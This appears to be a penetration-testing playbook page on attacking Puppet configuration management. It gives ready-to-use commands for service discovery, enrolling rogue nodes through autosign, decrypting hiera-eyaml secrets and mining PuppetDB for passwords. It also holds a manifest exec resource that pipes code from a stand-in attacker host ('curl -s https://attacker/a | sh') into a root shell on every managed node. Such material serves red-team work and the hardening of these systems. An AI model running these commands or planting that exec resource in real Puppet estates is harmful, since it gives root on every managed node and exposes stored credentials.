---
title: "Puppet: abusing the master, control repository, and PuppetDB"
description: "Attacking Puppet: injecting exec resources into the control repository or compromising the Puppet master so agents apply attacker code as root, abusing autosign to enroll rogue nodes, looting Hiera and hiera-eyaml secrets, and mining PuppetDB facts and reports for estate-wide reconnaissance."
keywords:
  - Puppet
  - puppet master
  - control repo
  - PuppetDB
  - hiera-eyaml
---

# Puppet

Puppet runs a pull model: an agent on each node fetches its compiled catalog from the Puppet server (TCP 8140) and applies it as root. The catalog is built from manifests that live in a control repository, so the leverage points are the code that produces catalogs, the server that compiles and serves them, and the data stores (Hiera, PuppetDB) that hold the environment's secrets and facts.

## Find the server and nodes

```bash
nmap -p8140,8081 -sV <target>                     # 8140 puppetserver, 8081 PuppetDB
ls /etc/puppetlabs/ /opt/puppetlabs/              # puppet.conf, code, ssl
grep -rniE 'autosign|ca_server|server =' /etc/puppetlabs/puppet/puppet.conf
```

## Inject into the control repository

Manifests are code, deployed from a Git control repository by r10k or Code Manager. An `exec` resource added to a manifest or module runs as root on every node in that environment at the next run (agents check in every 30 minutes by default):

```puppet
# added to a manifest that applies to the target nodes
exec { 'x':
  command => '/bin/sh -c "curl -s https://attacker/a | sh"',
  path    => '/bin:/usr/bin',
}
```

Write access to the control repo is estate-wide root execution; see [versioning](../versioning/git/hooks-and-config-execution.md) for gaining that write.

## Autosign and rogue nodes

If the CA is configured with `autosign = true` (or a weak autosign script), any host that requests a certificate for an **unused** name is signed and can enroll as a managed node, pull catalogs, and read the environment data those catalogs carry. Autosign does not issue a second certificate for a name that is already a managed node, so the lever is enrolling a new node, often one named to match a node-group or classification rule so it receives a privileged catalog, not impersonating an existing one:

```bash
puppet agent --test --server <puppetserver> --certname attacker-node.corp.local   # enroll a NEW name if autosign is on
```

## Loot Hiera and PuppetDB

Hiera is Puppet's data lookup; it holds per-node and per-environment data, including credentials. hiera-eyaml encrypts values, but the private key sits on the server:

```bash
find /etc/puppetlabs -name '*.eyaml' -o -name 'hiera.yaml'
# with the eyaml keys from the server, decrypt the values
eyaml decrypt -f secrets.eyaml --pkcs7-private-key /etc/puppetlabs/puppet/keys/private_key.pkcs7.pem
```

PuppetDB stores every node's facts, catalogs, and reports and exposes a query API. It is a reconnaissance goldmine: facts often carry secrets, and exported resources map trust relationships across the estate. PuppetDB listens with TLS and certificate authentication on 8081 and with plaintext HTTP only on the loopback port 8080, so query it from a foothold on the PuppetDB host over 8080, or over 8081 with a client certificate taken from a Puppet node:

```bash
# from a foothold on the PuppetDB host (local plaintext port)
curl -s 'http://localhost:8080/pdb/query/v4/facts' | jq '.[] | select(.name|test("password|secret|key";"i"))'
# remotely, with a node's client cert and key for the TLS listener
curl -s --cert node.pem --key node.key 'https://<puppetdb>:8081/pdb/query/v4/nodes' | jq '.[].certname'
```

## Follow-on

Control-repo or master compromise is root on every managed node; the Hiera secrets, PuppetDB facts, and signed certificates extend the reach and feed credential reuse into the wider estate.

## References

- [Puppet control repository and r10k / Code Manager](https://www.puppet.com/docs/pe/latest/control_repo)
- [PuppetDB query API (PQL)](https://www.puppet.com/docs/puppetdb/latest/api/query/v4/overview)
- [hiera-eyaml](https://github.com/voxpupuli/hiera-eyaml)
